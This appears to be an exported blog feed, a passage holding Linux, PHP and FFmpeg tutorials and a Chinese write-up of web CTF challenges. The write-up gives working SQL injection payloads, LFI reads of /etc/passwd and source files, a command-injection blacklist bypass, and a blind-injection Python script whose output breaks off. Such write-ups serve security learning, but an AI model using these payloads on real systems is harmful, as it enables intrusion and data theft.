(引用類型變數)的值為記憶體位址，該位址存放於Stack，而該位址所對應的值則是存在Heap。\n另外像是在「C++」中使用new生成的物件亦是存放在Heap，並且都會被建議當這類物件在不需要被使用時，開發者應該使用「delete」手動結束該物件的生命週期，因為Heap並不像Stack那樣有著固定的生命週期可以回收所創建的東西，因此若是程式語言沒有所謂的「Garbage Collection (GC, 垃圾回收)」機制，則可能會造成記憶體在程式執行過程中，被佔用的空間只增不減的問題，最後甚至導致記憶體不足以再供應程式使用。(而像是C#、Java、Go\u0026hellip; 等語言皆支援GC機制)\n前面所提到，Stack大小是固定的，因此可以說其所存放的資料長度是不變的，且對於Reference Type Variable也僅僅是存放記憶體地址，而存放於Heap的資料長度是要可以被更動的，因此該區段為Dynamic Memory Allocation (動態記憶體分配)。\nReferences # 《C 語言程式的記憶體配置概念教學 - G. T. Wang》https://blog.gtwang.org/programming/memory-layout-of-c-program/ 《CS 225 | Stack and Heap Memory》https://courses.engr.illinois.edu/cs225/sp2022/resources/stack-heap/ ","date":"2022/10/13","externalUrl":null,"permalink":"/posts/pwn-0x01-program-segments/","section":"","summary":"","title":"《Pwn - 0x01》Segments? Stack, Heap? .text, .data, .bss?","type":"posts"},{"content":"計算機領域中的「Pwn」是什麼意思？\n前言 # 在觀看本系列文章時，建議至少有撰寫高階語言的經驗，並且確保了解基礎的計算機概論相關知識，尤其程式編譯、組譯的意思，以及知道何為執行檔 (Binary)、記憶體。並且除了特別注明之外，操作環境之系統為Ubuntu 20.04.5 LTS。\n「Pwn」是什麼？ # 單字「Pwn」源自「Own(擁有)」這個詞，其主要含意為「在競爭環境中，對手完全慘敗，而自身處在完全勝利的情況下」。\n而在計算機領域當中，又被稱作「Binary Exploitation」，如字面上的意思，就是利用程式弱點達到目的，有著將目標拿下、獲得控制權等含意。\n例如駭客駭入伺服器，並且獲得 root 權限，此刻的情境可以說是「該駭客 Pwn(ed) 了伺服器」。\n(p.s. 「Pwn」有人念「碰」，有人念「胖」，阿我是都唸「胖」啦！)\nReverse Engineering (逆向工程) # 「Reverse Engineering」又稱作「逆向工程」，與Pwn息息相關。\n我們都知道，當我們所撰寫的高階程式語言（High-level programming language)被編譯 (Compile)成執行檔 (Executable)後，無法再透過Binary直接還原成高階語言，但這些Binary code是可以被解析成Assembly language (組合語言)的。\n因此透過分析組合語言，可以得知程式的的行為，並間接回推原本大致上的高階語言邏輯。\n像是常見的遊戲外掛 (非腳本)、破解軟體等，基本上都與逆向工程相關。\n正式開始，Start Learning Pwn! # 《Pwn - 0x01》Segments? Stack, Heap? .text, .data, .bss? References # 《Wiki - Pwn》https://zh.m.wikipedia.org/zh-tw/Pwn ","date":"2022/10/13","externalUrl":null,"permalink":"/posts/pwn-0x00/","section":"","summary":"\u003cp\u003e計算機領域中的「Pwn」是什麼意思？\u003c/p\u003e","title":"《Pwn - 0x00》Hello, Pwn!","type":"posts"},{"content":" What is \u0026ldquo;screen\u0026rdquo; Command # 這個指令可以於背景創造多個終端 Session，用於多線程的操作，並且可以輕易的在各個 Session 之間切換，且在用戶登出後，Session 仍可在背景運作。\nBasic Using # 以下是常見的參數：\n-ls 觀看存在背景的 -r [id] 回復互動視窗，指定 ID [id]，若背景只有一個 session 則不用指定。 -S [n] 指定一個名為 [n] 且已存在的 session，若不存在則創建一個 session 並指定名稱 [n]。(也可以不指定 [n]) -x [id] Attach 一個 session，與-r有些相似，但可以多人使用。 -X [cmd] 在創建 session 時指定在該 session 啟動完畢後欲執行的指令。也可以搭配-S指定要執行指令的 session。 -d [id] Detach session，用於將正在使用-r互動的視窗給移至背景(正在被使用-r的視窗是無法被其他使用者再次-r的，因此需要先-d)。該操作可遠端執行，可以指定 Session ID [id]。 -rd [id] 回復視窗之前 detach 其他視窗，等同於先執行-d後執行-r。 -d -m, -dm Detach mode, 於 detach 模式下啟動一個 session。 先創建 session 後按下 Ctrl+a d 可以將 session detach。\nExample # 創建名為「example」的 Session # 1screen -S example 查看當前存在的 Session # 1$ screen -ls 2There is a screen on: 3 43434.example (09/17/22 15:06:45) (Attached) 41 Socket in /run/screen/S-Bob. 若是該 session 生命週期已經結束，則會被標示「dead」，使用參數-wipe可以移除這些 sessions：\n1$ screen -wipe 2There is a screen on: 3 43434.example (09/17/22 15:06:45) (Attached) 41 Socket in /run/screen/S-Bob. Detach Session (背景運作) # 按下 Ctrl+a 後按下 d。\nAttach 「example」 Session(互動 Session) # 1screen -r example 若是顯示「There is no screen to be resumed matching example.」則表示該 session 目前處於attached狀態。\n該情況需要先進行detach再使用-r回復，或是一起執行：\n1screen -rd example 或者使用-x的方式：\n1screen -x example 若是多人用戶的模式下，可以使用\u0026lt;user\u0026gt;/\u0026lt;screen\u0026gt;來指定該使用者的 session，例如使用者名為「Bob」，並該使用者有著一個 session 名為「example」，則可以：\n1screen -x Bob/example 退出 Session # 可以透過以下方式來將指定的 session 退出，舉例要退出「example」session：\n1screen -X -S example quit 多人模式設定 # 以下指令執行於按下 Ctrl+a 後直接輸入：\n:multiuser on：開啟多人使用模式(允許其他使用者進入 session)。\n:multiuser off：關閉多人使用模式。\n:acladd \u0026lt;user\u0026gt;：多人使用模式下，允許使用該 session 的使用者白名單。\n:acldel \u0026lt;user\u0026gt;：多人使用模式下，移除可使用該 session 的使用者。\n","date":"2022/09/15","externalUrl":null,"permalink":"/posts/screen-command/","section":"","summary":"","title":"\"Screen\" Command 讓程式在背景執行，並隨意切換，即便登出也不會中斷！","type":"posts"},{"content":" Prologue # This was tested on the Ubuntu 20, I\u0026rsquo;m not sure if it will work on yours if you are not using the same system. # The commands we discuss in this article may need to be used with sudo when you don\u0026rsquo;t have permission. # Command timedatectl to see current timezone setting # Run timedatectl to check the current timezone:\n1$ timedatectl 2 Local time: Wed 2022-08-24 13:32:04 CST 3 Universal time: Wed 2022-08-24 05:32:04 UTC 4 RTC time: Wed 2022-08-24 05:32:04 5 Time zone: Asia/Taipei (CST, +0800) 6System clock synchronized: yes 7 NTP service: active 8 RTC in local TZ: no Command timedatectl list-timezones to list timezones # Run timedatectl list-timezones to list the timezones, and find out the timezone which you want to set:\n1$ timedatectl list-timezones 2Africa/Abidjan 3Africa/Accra 4Africa/Addis_Ababa 5... 6Asia/Taipei 7... 8W-SU 9WET 10Zulu Command timedatectl set-timezone to set timezone # Use timedatectl set-timezone \u0026lt;timezone\u0026gt; command to set the timezone, for example:\n1$ timedatectl set-timezone Asia/Taipei Then use command timedatectl after set to check timezone again.\nReferences # 《How To Set or Change Timezone on Ubuntu 20.04》https://linuxize.com/post/how-to-set-or-change-timezone-on-ubuntu-20-04/ ","date":"2022/08/24","externalUrl":null,"permalink":"/posts/ubuntu-set-timezone/","section":"","summary":"","title":"How to set timezone on ubuntu?","type":"posts"},{"content":"","date":"2022/07/12","externalUrl":null,"permalink":"/tags/mysql/","section":"Tags","summary":"","title":"MySQL","type":"tags"},{"content":"","date":"2022/07/12","externalUrl":null,"permalink":"/tags/pdo/","section":"Tags","summary":"","title":"PDO","type":"tags"},{"content":"","date":"2022/07/12","externalUrl":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"PHP","type":"tags"},{"content":"Don\u0026rsquo;t continue to use original MySQL functions in PHP, let\u0026rsquo;s try PDO !\nWhy choose PDO ? # First, MySql functions (such mysqli_connect()、mysql_connect()) as its name looks，only for MySQL.\nBut PDO is more than that !\nPDO supported 12 different drivers, which includes MySQL、Oracle、SQLite、MS SQL、IBM\u0026hellip;and more. (Read documentatin from official for more)\nAnd more importantly, it\u0026rsquo;s able to effectively prevents SQL Injection.\nHow to connect ? # It\u0026rsquo;s needed be the instance.\n1define(\u0026#39;DB\u0026#39;,[ 2 \u0026#39;host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, # the host of database server 3 \u0026#39;user\u0026#39; =\u0026gt; \u0026#39;root\u0026#39;, # the user of database 4 \u0026#39;pass\u0026#39; =\u0026gt; \u0026#39;password\u0026#39;, # the password of user 5 \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;database\u0026#39;, # the name of database 6]); 7 8$db_connect = new PDO(\u0026#34;mysql:host=\u0026#34;.DB[\u0026#39;host\u0026#39;].\u0026#34;;dbname=\u0026#34;.DB[\u0026#39;name\u0026#39;].\u0026#34;;charset=utf8mb4\u0026#34;, DB[\u0026#39;user\u0026#39;], DB[\u0026#39;pass\u0026#39;]); 9 10if(!$db_connect){ die(\u0026#39;Database: failed connection !\u0026#39;); } # check if connection is failed And also recommend that use the follwing settings (just put it below the code above):\n1# Allow to use the \u0026#34;Prepared Statement\u0026#34;. 2# It prevents the SQL Injection from happening. (false) 3$db_connect-\u0026gt;setAttribute(PDO::ATTR_EMULATE_PREPARES, false); 4 5# Whether to prevent convert numeric values to strings when fetching. (false) 6$db_connect-\u0026gt;setAttribute(PDO::ATTR_STRINGIFY_FETCHES, false); For more detail, see the PHP official website https://www.php.net/manual/en/pdo.setattribute.php\nPre-Query \u0026amp; Execute # Pre-Query # 1$sql = \u0026#34;SELECT * FROM `table` WHERE `id`=:id OR `name`=:name;\u0026#34;; 2$query = $db_connect-\u0026gt;prepare($sql, array(PDO::ATTR_CURSOR =\u0026gt; PDO::CURSOR_FWDONLY)); Just put the sentence of SQL query to the prepare() function, and the values of sentence are able to use the format :value to represent the value field. (the value in :value can be change the any word you want, except the few sensitive words. And it\u0026rsquo;s NOT allow to use the duplicate name.)\n(It hasn\u0026rsquo;t not yet be executed from now.)\nExecute # 1$values = [ 2 \u0026#39;:id\u0026#39; =\u0026gt; 123, 3 \u0026#39;:name\u0026#39; =\u0026gt; \u0026#39;admin\u0026#39;, 4]; 5 6$result = $query-\u0026gt;execute($values); 7 8if($result === false){ die(\u0026#39;Query Error !\u0026#39;); }; Put the values to the execute() function (using array format), and it will return the result, also possible to return false when the query got the some errors.\nReferences # 《PHP: PDO - Manual》https://www.php.net/manual/en/book.pdo.php\n","date":"2022/07/12","externalUrl":null,"permalink":"/posts/php-mysql-query-with-pdo/","section":"","summary":"\u003cp\u003eDon\u0026rsquo;t continue to use original MySQL functions in PHP, let\u0026rsquo;s try PDO !\u003c/p\u003e","title":"PHP MySQL query with 「PDO」","type":"posts"},{"content":"","date":"2022/07/12","externalUrl":null,"permalink":"/tags/sql/","section":"Tags","summary":"","title":"SQL","type":"tags"},{"content":"","date":"2022/07/07","externalUrl":null,"permalink":"/tags/ffmpeg/","section":"Tags","summary":"","title":"FFmpeg","type":"tags"},{"content":" FFmpeg # A complete, cross-platform solution to record, convert and stream audio and video.\n- https://ffmpeg.org/\nDownload # You can download it very simply.\n1# Debian / Ubuntu 2sudo apt-get install ffmpeg 3 4# Arch Linux 5sudo pacman -S ffmpeg 6 7#REHL / CentOS / Fedora 8sudo dnf install ffmpeg 9sudo rpm install ffmpeg 10sudo yum install ffmpeg Using # Change FPS # 1ffmpeg -i input.avi -filter:v fps=fps=30 output.avi It\u0026rsquo;s means change the FPS of file \u0026ldquo;input.avi\u0026rdquo; to 30, and output its filename to \u0026ldquo;output.avi\u0026rdquo;.\nConvert format # For default method, you can just using like that:\n1ffmpeg -i input.mp4 output.avi Reduce file size # Calculate the bitrate you need by dividing your target size (in bits) by the video length (in seconds). For example for a target size of 1 GB (one gigabyte, which is 8 gigabits) and 10 000 seconds of video (2 h 46 min 40 s), use a bitrate of 800 000 bit/s (800 kbit/s):\n1ffmpeg -i input.mp4 -b 800k output.mp4 Additional options that might be worth considering is setting the Constant Rate Factor, which lowers the average bit rate, but retains better quality. Vary the CRF between around 18 and 24 — the lower, the higher the bitrate.\n1ffmpeg -i input.mp4 -vcodec libx264 -crf 20 output.mp4 - Vicky Chijwani on StackExchange\nBy the way, you are able to change the video format to H.265, it\u0026rsquo;s better than H.264.\nAnd also you can add arugument fps-fps=30 to specify the FPS to 30, so it will be looks like that:\n1ffmpeg -i input.mp4 -vcodec libx265 -crf 20 fps-fps=30 output.mp4 More Detail # For more detail, please go to watching the documentation of FFmpeg Offical Website.\nHere is the link: https://ffmpeg.org/ffmpeg.html\nReferences # 《FFmpeg》https://ffmpeg.org/ 《linuxhint - How to Reduce Video Size With FFmpeg, John Otieno》https://linuxhint.com/how-reduce-video-size-with-ffmpeg/ 《StackExchange - How can I reduce a video\u0026rsquo;s size with ffmpeg?》https://unix.stackexchange.com/questions/28803/how-can-i-reduce-a-videos-size-with-ffmpeg ","date":"2022/07/07","externalUrl":null,"permalink":"/posts/ffmpeg/","section":"","summary":"","title":"How to use FFmpeg ?","type":"posts"},{"content":"簡單幾步變更家目錄的語言\n$LANG # 可以透過查看變數「$LANG」來得知當前系統所使用的語系。\n直接在終端輸入「echo $LANG」列印：\n1$ echo $LANG 2en_US.UTF-8 如上例子顯示「en_US.UTF-8」。\n可以改變該變數來更換系統所使用的語系，變更方式為「export LANG=\u0026lt;語系\u0026gt;」。\n例如想要變更成「en_US」且為「UTF-8」，則輸入：\n1$ export LANG=en_US.UTF-8 2 3# 接著印出變數就可以看到成功更改了 4$ echo $LANG 5en_US.UTF-8 更換家目錄語系 # 可以使用指令「xdg-user-dirs-gtk-update」來讓系統自動偵測語系的變更：\n1xdg-user-dirs-gtk-update 接著會跳出詢問是否更改的視窗，這邊建議將「Don't ask me this again」選項勾選，否則每次啟動都會彈出詢問。\n然後按下「Update Nmaes」按鈕即可。\n變更後，舊資料夾仍存在！？ # 若是變更後仍有舊的資料夾存在，這可能是因為資料夾中有檔案需要使用者手動轉移到新目錄。\n你只需要手動將檔案轉移後刪除舊資料夾即可。\n手動修改 # 當然也可以透過手動修改！\n自行將目錄更名後，接著只需要修改檔案「~/.config/user-dirs.dirs」對應即可：\n1vim ~/.config/user-dirs.dirs 接著重啟服務「/etc/init.d/gdm」：\n1sudo /etc/init.d/gdm restart References # 《程式寫得好，要飯要到老。: Ubuntu中文資料夾改成英文》http://derayxu.blogspot.com/2016/07/ubuntu.html?m=1 ","date":"2022/07/07","externalUrl":null,"permalink":"/posts/ubuntu-change-home-folder-language/","section":"","summary":"\u003cp\u003e簡單幾步變更家目錄的語言\u003c/p\u003e","title":"Ubuntu 更改家目錄語言","type":"posts"},{"content":"","date":"2022/04/11","externalUrl":null,"permalink":"/tags/ctf/","section":"Tags","summary":"","title":"CTF","type":"tags"},{"content":" 前言 # 之前沒有打 CTF，這陣子心血來潮想說也來玩玩看好了，順便做個紀錄。\n有些題目真的設計的蠻有趣的，後悔沒有早點接觸。\n以下的內容包含解答，並且只有Web題內容，介意者請斟酌觀看。\nLink # 首頁：https://ctf.hackme.quest/\n題目：https://ctf.hackme.quest/scoreboard/\n輸入 Flag 的位置在題目頁面下方\n15. hide and seek # Can you see me? I\u0026rsquo;m so close to you but you can\u0026rsquo;t see me.\n這題是個開場，題目本身就在首頁 https://ctf.hackme.quest/ 中。\n算是一個不成文的默契吧，第一題 flag 通常就放在原始碼下。\nFLAG{0h U C meeeeeeeeeeeeeeeeeeee!}\n16. guestbook # This guestbook sucks. sqlmap is your friend.\n該頁面有一個讓訪客可以留言並觀看的功能，加上題目提示提到「sqlmap」，所以這題應該是 SQL Injection。\n點擊New Post可以張貼文章，Message List 可以看到張貼的文章。\n先發篇測試，然後到Message List查看：\n到目前為止都沒問題，但看到了網址後，感覺有注入點可以嘗試。\n嘗試讓id值失效，並在後面加上臭名昭彰的union select大法試試，然後就踹到了：\nid=-133 UNION SELECT 1,2,3,4 -- # 接著就開始循序踹database name、table name、column name\u0026hellip;\nid=-133 UNION SELECT 1,2,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),4 -- # 找到table name為「flag」\nid=-133 UNION SELECT 1,2,(SELECT column_name FROM information_schema.columns WHERE table_name=\u0026#39;flag\u0026#39; LIMIT 1),4 -- # 找到column name也叫「flag」\n接著直接查詢該欄位第一筆資料：\nid=-133 UNION SELECT 1,2,(SELECT flag FROM flag LIMIT 1),4 – # 有點尷尬的是它回覆了一個網址，該網址是一張動圖\u0026hellip;\n找第二筆資料就可以看到 flag 了：\nid=-133 UNION SELECT 1,2,(SELECT flag FROM flag LIMIT 1,1),4 – # 17. LFI # What this admin\u0026rsquo;s password? That is not important at all, just get the flag.\nTips: LFI, php://filter\n該頁面共有四個連結，「Hack Me」連到首頁，其餘三個分別是採用GET方式傳路徑的方式，估計是用該參數來決定要引入什麼頁面，而這邊應該就有漏洞了。\n舉例Home連結傳送了「?page=pages/index」，先嘗試更改路徑成不存在的目錄?page=pages/abc：\n嘗試訪問敏感資訊?page=pages/../../etc/passwd：\n確診 LFI\n題目提示「php://filter」，這是 PHP 的功能，我們可以利用它來幫助我們讀出原始碼，這很常在 CTF 上看到。\n使用php://filter/read=convert.base64-encode/resource=path即可以base64編碼的方式讀取該檔案(resource的值)，於是乎：\n?page=php://filter/read=convert.base64-encode/resource=pages/index 把它拿去解碼，得到訊息「There is no second place like 127.0.0.1」，看來 flag 不在這個檔案中。\n嘗試看看Login，並解碼：\n?page=php://filter/read=convert.base64-encode/resource=pages/login 1\u0026lt;?php 2require(\u0026#39;config.php\u0026#39;); 3if($_POST[\u0026#39;user\u0026#39;] === \u0026#39;admin\u0026#39; \u0026amp;\u0026amp; md5($_POST[\u0026#39;pass\u0026#39;]) === \u0026#39;bed128365216c019988915ed3add75fb\u0026#39;) { 4 echo $flag; 5} else { 6?\u0026gt; 7\u0026lt;form action=\u0026#34;?page=pages/login\u0026#34; method=\u0026#34;post\u0026#34; role=\u0026#34;form\u0026#34;\u0026gt; 8 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 9 \u0026lt;label for=\u0026#34;user-i\u0026#34;\u0026gt;User\u0026lt;/label\u0026gt; 10 \u0026lt;input type=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;user-i\u0026#34; placeholder=\u0026#34;Username\u0026#34; name=\u0026#34;user\u0026#34;\u0026gt; 11 \u0026lt;/div\u0026gt; 12 \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; 13 \u0026lt;label for=\u0026#34;pass-i\u0026#34;\u0026gt;Password\u0026lt;/label\u0026gt; 14 \u0026lt;input type=\u0026#34;password\u0026#34; class=\u0026#34;form-control\u0026#34; id=\u0026#34;pass-i\u0026#34; placeholder=\u0026#34;Password\u0026#34; name=\u0026#34;pass\u0026#34;\u0026gt; 15 \u0026lt;/div\u0026gt; 16 \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Login\u0026lt;/button\u0026gt; 17\u0026lt;/form\u0026gt; 18\u0026lt;?php } ?\u0026gt; 找到變數$flag，但似乎是被宣告在config.php這個檔案中，所以再用php://filter戳它一次：\n?page=php://filter/read=convert.base64-encode/resource=pages/config 1\u0026lt;?php 2$flag = \u0026#34;FLAG{Yoooooo_LFI_g00d_2cXxsXSYP9EVLrIo}\u0026#34;; 18. homepage # Where is the flag? Did you check the code?\n這題一樣是在首頁，題目提示你看程式碼的部份。\n其實只要看 console 的部份就可以看到大大的 QR Code 了\n掃下去就可以得到 Flag FLAG{Oh, You found me!!!!!! Yeeeeeeee.}\n這邊是去引入一個叫做cute.js的檔案，裡面的東西非常奇葩\u0026hellip;\n後來看到有人說是一種叫做「AAEncode」的編碼\u0026hellip;專門把 Javascript 轉成顏文字。\n拿去 Decode 之後就可以得到：\n1function print_qrcode(qrcode, color, fill) { 2 var args = []; 3 var buff = []; 4 5 for (var i = 0; i \u0026lt; qrcode.length; i++) { 6 var row = qrcode[i]; 7 for (var j = 0; j \u0026lt; qrcode[0].length; j++) { 8 buff.push(\u0026#34;%c\\u2588\\u2588\u0026#34;); 9 args.push(\u0026#34;color:\u0026#34; + (\u0026#34;1\u0026#34; == row[j] ? color : fill)); 10 } 11 buff.push(\u0026#34;\\n\u0026#34;); 12 } 13 args.unshift(buff.join(\u0026#34;\u0026#34;)); 14 console.log.apply(console, args); 15} 16var qrcode = [\u0026#34;11111110001000110011101111111\u0026#34;, \u0026#34;10000010111000110100101000001\u0026#34;, \u0026#34;10111010100000100100001011101\u0026#34;, \u0026#34;10111010010010010001001011101\u0026#34;, \u0026#34;10111010111010111010101011101\u0026#34;, \u0026#34;10000010101010011001001000001\u0026#34;, \u0026#34;11111110101010101010101111111\u0026#34;, \u0026#34;000000001011000101101\u0026#34;, \u0026#34;1101001100011110101000111011\u0026#34;, \u0026#34;1111000111011010110011110001\u0026#34;, \u0026#34;1101111000011100101100011001\u0026#34;, \u0026#34;110111011111110110110101001\u0026#34;, \u0026#34;01011011001100101111111101001\u0026#34;, \u0026#34;00100101010101000101110000111\u0026#34;, \u0026#34;00011011000101100110011001111\u0026#34;, \u0026#34;1010110101010001111101101001\u0026#34;, 17\u0026#34;00001011110011000111110001111\u0026#34;, \u0026#34;0101100100001110100011110001\u0026#34;, \u0026#34;10010111100110100010110111011\u0026#34;, \u0026#34;0010110110101011011010011101\u0026#34;, \u0026#34;10010110010000001010111110111\u0026#34;, \u0026#34;0000000011110010110110001111\u0026#34;, \u0026#34;1111111010100000101010101111\u0026#34;, \u0026#34;10000010000000111000100011101\u0026#34;, \u0026#34;10111010001010001000111110011\u0026#34;, \u0026#34;1011101010111000001010100111\u0026#34;, \u0026#34;10111010001010000111110010001\u0026#34;, \u0026#34;1000001011101111111110010101\u0026#34;, \u0026#34;1111111011010110010011001101\u0026#34;]; 18print_qrcode(qrcode, \u0026#34;#333\u0026#34;, \u0026#34;#fff\u0026#34;); 19. ping # Can you ping 127.0.0.1?\n這題是玩Command Injection，題目提供了原始碼，可以看到有個black list在擋我們的payload，任務就是繞過它。\n其實資安一直在說的一個觀念就是，多使用white list而非black list。\n這題可能是想傳達這樣的概念吧。\n先測試正常使用，在輸入框中寫上127.0.0.1：\n它會將輸出原封不動顯示出來。\n黑名單中擋了許多東西，但\u0026hellip; 沒有擋到$、(、)，因此可以用$(command)來觸發指令。\n先使用ls查看當前目錄下有什麼，輸入$(ls)：\n可以看到ping的錯誤使用提示，這段訊息已經足夠讓我們知道，該目錄下有index.php及flag.php這兩個檔案了。\n接下來就是將flag.php的內容給輸出，直覺上會使用cat指令，但它在黑名單中。\n不過要查看檔案內容有許多方式，例如有個指令叫做tac，它是cat倒過來寫，意思是由檔案最後一行往前讀取。\n至於檔名的部份，同樣因為黑名單無法直接輸入flag.php，這個繞過的方式也是一堆，這邊就不贅述，用*繞過即可。\n輸入$(tac fla*)，獲得 flag FLAG{ping_$(capture-the-flag)_UtUbtnvY5F9Hn5dR}：\n20. scoreboard # DO NOT ATTACK or SCAN scoreboard, you don\u0026rsquo;t need to do that.\n這題也算是常見的一種玩法，就是把訊息塞在封包的header中，你可以在裡面找到一個叫做x-flag的東西。\nFLAG{Header can hide some data aswell.}\n21. login as admin 0 # SQL Injection!\nUm\u0026hellip; 非常明確，就是 SQL Injection，試著戳進登入系統。\np.s. 關於login as admin的題目有好多個階段。\n先照它說的輸入guest/guest看看：\n(p.s. 點擊上面的 Source Code 可以看原始碼)\n嘗試帳號輸入admin，密碼用\\' OR 1 -- #繞過：\nUm\u0026hellip; 登入是登入了，但這種方式只能進到第一筆資料，而第一筆資料放的是guest。\n但不影響，這已經確認存在 SQL Injection，只要稍微修改 Payload 即可。\n帳號admin，密碼輸入\\' OR 1 LIMIT 1,1 -- #來看第二筆資料：\n拿到 Flag FLAG{\\' UNION SELECT \u0026quot;I Know SQL Injection\u0026quot; #}\n22. login as admin 0.1 # Grab the hidden flag\n同一個頁面，要找到另一個 Flag。\n猜測 Flag 應該也是放在資料庫中，因此開始踹大門：\n帳號admin，密碼輸入\\' UNION SELECT 1,database(),3,4 -- #：\n可以看到UNION SELECT大法奏效。\n接著進一步撈資料庫，先找出該資料庫中的table有哪些：\n\\\u0026#39; UNION SELECT 1,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() ),3,4 -- # 找到 table h1dden_f14g。\n再挖它的欄位：\n\\\u0026#39; UNION SELECT 1,(SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name=\u0026#34;h1dden_f14g\u0026#34;),3,4 -- # 欄位叫做the_f14g，直接查詢就拿到 Flag FLAG{Good, Union select is quite easy to exploit!}\n\\\u0026#39; UNION SELECT 1,(SELECT GROUP_CONCAT(the_f14g) FROM h1dden_f14g),3,4 -- # 23. login as admin 1 # Please login as admin.\nTips: SQL Injection but sqlmap not working anymore.\nUpdate: Source code is available now.\nScanner WON'T WORK\nUm\u0026hellip; 測試一下，上一題的 Payload 在這題已經無效了。\n那麼嘗試戳出其他洞看看。\n戳了一下發現，可以把\\'/**/OR/**/1/**/#塞在密碼來登入。\np.s. SQL 可以用/**/來代替空格\n雖然成功登入admin，但卻沒有讀取 Flag 的權限：\n開使用UNION SELECT大法\\'/**/UNION/**/SELECT/**/1,2,3,4/**/#：\n拿到 Flag FLAG{He110, Admin\\\\' or 1337 \u0026lt; 314159 #}\n(os: 我以為還要再戳進去才會看到\u0026hellip;)\n24. login as admin 1.2 # Get another flag\nTips: boolean-based SQL injection, information_schema\n原以為跟前面的套路一樣，用UNION SELECT踹進大門就可以看到其他隱藏的 Flag。\n但問題是，這個頁面並沒有顯示任何UNION SELECT出來的欄位。\n沒有直接顯示我們要的回應資訊，那麼就只能盲注了。\n(這題是boolean-based的blind-injection)\n雖然說無法直接取得回應，但可以知道兩個資訊\n該資料表有4個欄位(用UNION SELECT試出來) 有個判斷「是否為管理員」的機制 先猜測這四個欄位中，有一個是用來判斷是否為管理員的。\n因此分別將其設置為0來看是哪個欄位：\n\\'/**/UNION/**/SELECT/**/0,2,3,4/**/# \\'/**/UNION/**/SELECT/**/1,0,3,4/**/# \\'/**/UNION/**/SELECT/**/1,2,0,4/**/# \\'/**/UNION/**/SELECT/**/1,2,3,0/**/# 前1到3個欄位為0時均回應「You are admin!」\n第4個欄位為0時則回應\n由此可以猜測，第4個欄位應該就是一個boolean判斷是否為管理員的功能。\n這裡就可以當作一個盲注的互動點。\nBlind-Injection 流程解析\n第一步一樣先撈出table名稱，於是一樣使用之前的 payload\n1SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database() 但無法直接得出回傳結果，所以要將上述的句子改為用判斷式確認，以回傳boolean的方式來檢測是否正確。\n白話的說，在前幾題，我們是直接詢問 server「請問 table 名稱是什麼？」，然後 server 直接回應查詢結果。\n而這題的 server 只會回答是或否，雖然說麻煩了點，但我們依舊可以與 server 達到互動。\n你只需要一直嘗試問 server「請問 table 名稱是xxx嗎？」，server 回應「否」，你又再問「那麼是ooo嗎？」，server 又回答你「否」，直到 server 回應「是」，這時候你就知道 table 的名稱是什麼。\n但這樣做是以暴力破解的方式，這可會耗上大把時間，有更好的作法。\n我可以詢問 server 「請問 table 名稱第一個字是「a」嗎？」一直問到回應「是」後，接著問第二個字。\n寫成 SQL Payload 的話大概是：\n1\\\u0026#39;/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()),字元序,1))=\u0026#34;猜測字元的 ASCII\u0026#34;,1,0)/**/# 整個語法第四個UNION SELECT的欄位被換成這句：\n1IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()),字元序,1))=\u0026#34;猜測字元的 ASCII\u0026#34;,1,0) 這邊先用到了「SUBSTR()」這個 SQL Function 來取 table 名稱的第幾個字，它的用法是SUBSTR(字串,從第幾個字開始,取幾個字)。\n所以上面的例子中，字串為GROUP_CONCAT(table_name)回傳的結果，也就是所有 table 的名字。\n而從第幾個字開始就是對應到了例子中的字元序，這是一個變數。\n最後取幾個字填上1，每次只猜一個字。\n這麼一來就會陸續返回一個字元，在拿這個字元來比對我們是否猜對。\n但由於這可能包含特殊符號，因此在比對之前，習慣先用一個 Function「ASCII()」來將字元轉成ASCII編碼，再做比對。\n當然後方的猜測字元的 ASCII就是陸續填入可視字元範圍的ASCII Code即可。\n(p.s. 可視字元 ASCII Code 範圍為 32 ~ 127)\n這需要嘗試非常多次，因此通常這題會建議寫成腳本來執行。\n以下使用 python3 來撰寫請求及判斷回應的腳本，用這種方式來blind-injection。\n1import requests 2from bs4 import BeautifulSoup 3 4datas = {\u0026#39;name\u0026#39;: \u0026#39;admin\u0026#39;, \u0026#39;password\u0026#39;: \u0026#34;payload\u0026#34;} 5table = \u0026#39;\u0026#39; 6 7for i in range(1,128): 8 print(str(i)+\u0026#34;: \u0026#34;, end=\u0026#34;\u0026#34;) 9 for j in range(32,127): 10 datas[\u0026#39;password\u0026#39;] = 11 \u0026#39;\\\\\\\u0026#39;/**/UNION/**/SELECT/**/1,2,3,IF(ASCII(SUBSTR((SELECT/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()),\u0026#39;+str(i)+\u0026#39;,1))=\u0026#34;\u0026#39;+str(j)+\u0026#39;\u0026#34;,1,0)/**/#\u0026#39; 12 r = requests.post(\u0026#39;https://ctf.hackme.quest/login1/\u0026#39;, data=datas) 13 soup = BeautifulSoup(r.text, \u0026#39;html.parser\u0026#39;) 14 text = soup.find(\u0026#39;h4\u0026#39;).text 15 if text==\u0026#39;You are admin!\u0026#39;: 16 table = table + chr(j) 17 print(\u0026#34;Table: \u0026#34;+table) 18 break 預估整個GROUP_CONCAT(table_name)長度在128以下，所以寫一個跑128次的迴圈。\n而該迴圈裡面在寫一個迴圈用來陸續填入可視字元範圍比對。\n最後判斷返回的結果若顯示「You are admin!」則表示 server 回應是，這時候就將該字元記錄下來。\n程式執行結果如下：\n1$ python3 ctf.php 2 31: Table: 0 42: Table: 0b 53: Table: 0bd 64: Table: 0bdb 75: Table: 0bdb5 86: Table: 